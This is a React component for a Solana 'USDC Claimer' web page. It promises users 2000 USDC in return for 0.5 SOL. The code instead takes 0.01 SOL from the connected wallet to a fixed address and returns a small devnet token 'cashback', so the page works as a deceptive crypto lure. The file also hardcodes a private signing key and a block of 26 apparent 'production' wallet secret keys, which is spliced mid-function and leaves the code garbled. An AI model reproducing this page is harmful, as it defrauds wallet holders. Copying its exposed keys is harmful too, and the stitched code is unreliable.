/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "Sk5LDkEacyNEgFE5dFfjh6imM3dz5Kcy3Npkdv4YexPcD3Xn6n1RbasBF9u41H8o2eU9AUijD3bEgm1AsFn6FSY"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "4mAKcWR8RJJdBN5aGPmzViJfgmic1Jv5qmhwgVzwTC8tJGe5EBQkJiN1V5WuxWCjf7AqP6meaQrgo4N5sh8grAeN",
  "key1": "4W4WWUrR6yQHwsK6TgeX13sNhPArdcFs2FqFrNvZ6UUMp4n76qj5xvBQWYzPnRTzpRp1nSRDZZBvCNk8nmVUWTjX",
  "key2": "4NkNNBTnc45Nu8Q9QmWz57LWsfDZvjKv5MCK4AQHTzae8VwiV4pKHDE11JSKq9PkZNNpY1NmKWQN9GT6KkcHuYYj",
  "key3": "4k1KtALoLRqWoJev7QRXKof1CEo25Z4t7itcxGUd4Chxv9u9gUBxCsh12WGaDM4V4AvaZWpByujhpmDW9k5jbefA",
  "key4": "4gh99MRaGeARPbbSv2oQ2Ko1pkebpBDG87nzdmx4x5EUodjLPLZwwcFfZEzLreniY6F3u3L8DcqwnBcDyMm7uVuE",
  "key5": "5WYEqTUDaWNqujBynZ7Gwh2ZdnjMeBGfQQAECae2LDMH1FcrR57ZZHVgSnZozgUbwJ7UMayq5oBggQMuwPR7832K",
  "key6": "3BErocRXFdGMoMzJpmX5Tpd6mEX4CSfUBv4UzuA1q8qxCDFpiRRXUtoNwd8N5oiWua6MYoDxgdwQ57mdewQ4GJZg",
  "key7": "qK94H1BPDNtQs8csTm74Stp1HBrF5CCozKVVuGdJ1qTxtjt97JFtjTSC3YdyVdWnqr3H5vK9ZrTKn6FDoWL9Lh3",
  "key8": "4bQ6ZrjpxJRKjCGKzotVAf6TTaSdSx4mbp4xz5vbAp3m4xB5PQcLomZUYMUEJH9aACQPJ5uZTwQBh7yqnWhc2w3S",
  "key9": "4j6JC1v7cxNuJTX75R92CU2T3Pd1imYW274kMWm9CDhA7xPMu64Siq2Feo8CrSLqPqhu6puZvopfxsyNNaTjh4Dq",
  "key10": "4LV3zhcMZGAKyhwXHs3qpWEZm8EGahGAcnyWtmaCd5LcEASZgY6jubmMeJVfeZBXNQHpMG4ZmMycKddEnsqufSh2",
  "key11": "UR4gJDRAUcHEKXSuTzCBC1LBwiPTREtAygTvKBjxA2zhYLRL1mjbhaDjBUKzc9aqrbUhyEJyFQfooYe5Tf2RSS2",
  "key12": "41KaGu54JbFSAVaAmrHpPiJNXYBp9Rk8MuvvsbSS7yQh74ba6b5rChuziDhD6StVXroVoQjRYYX6F4KLfq7Uwk1i",
  "key13": "4xBBByJHKfa3R8yxJC8AQ8HdKqgbUTQCRDiU2Gkp2kWgCvr7V1ARxssUmFM1a7tqky4XmxkxfjNFB3jhy2GvbwqJ",
  "key14": "2ZLwPvRpAh4VB1SfUYHd6oFB7RyVr7D5HSM4sXq3zjbVivngWGKQvbumNcpH3vSTDjSCd88HPqDvJXek6n5XP4dR",
  "key15": "4uv294yZuFMfCAHZNL4CDVYgMxUMJBmJTWpfz7J7bpRou6o7CuRnoP2FP9H5rzRKU7KbXsrP4bBb1YLprqptMZLQ",
  "key16": "z3VcHjBRPyXcTnL1gTrfXtSije8z8Ss1uUy5DKCReN5GiTQduiAkq8oyg4jdTqsTJ9hxvSDmCk8zZ6Uc39e5eWu",
  "key17": "2so9cpWvvRkSSjfqCn3jW7HixEDyciDci7gJHegQYHdzqXGhA1ifizw28acdZqrbTNYePA1tn5fYuuSj4CGj9hQ7",
  "key18": "4FqyHf54b9F9xzybe4L7aZH91nX6JH6LXddGCTDiTjyQNSqowQGSZyAqBnoMsxPm114KeaJdq6NuabXzRRBPcXHa",
  "key19": "5R9YsMUvPT2LF1EXZLS6niwPeCr5sBXgTgorigKjapQP6UJ7Xt3aqwQMhqQCiENfEv9dQyJWaH8BrLm36stYzGvg",
  "key20": "GX6i9ongXAhpZCwavJ8hp5y49CYCA5Pxw2et4yPwaTUisz7mZXbdNPbcBE1Fhi28gDwfFPoB6fsi8fUH7ruVGse",
  "key21": "42AnJN9PRtYRLbZJGRqBfwzeg3WTABCrrLVsvr2gwTRL9SZoyQ4t3k8PSyowmdJuCnqwuAGQjiAHDMwuJUsbpaKy",
  "key22": "4x3xN5zT18Dpor1cppTNSgYCQEbbRFZS7WR988vd5oUVDxxyyNaixJbjAYwrFLr72TMjKjPF6mASdo5EGKeoCLAv",
  "key23": "444UQrz5ithX9hceVEkKK166LUBcj8Zh9HdKK1EAxRRmgyqpFcjiseE4QBPDnCoy9ZF2YqFp43YAta4hAJfcJM2R",
  "key24": "4KTNSgyknydz69DKLzedbgD7BXDrjcaAAANzyo395rnGR3C5m6rJzKRbDWyaJKy5xWMZ34yXCxYBMRVhNLhxzVD6",
  "key25": "8KqsXSzAM3huJm7W9RoVn9WhuQCZR4ZBVUjvqNB3CuebxtyVcWANzp58EE53cqayTDRfCdvjnNnXKwfTqVfVruK"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
